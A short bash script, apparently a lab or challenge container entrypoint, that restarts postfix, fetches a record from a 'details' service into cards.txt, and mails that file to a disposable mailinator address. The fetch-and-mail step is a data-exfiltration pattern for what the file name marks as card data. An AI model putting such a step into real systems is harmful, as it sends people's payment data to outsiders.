#!/bin/bash

service postfix restart
sleep 10


curl http://details:${CARDSPORT}/details/372 >> cards.txt
sendmail blablablu@mailinator.com < cards.txt

while true; do sleep 1000; done

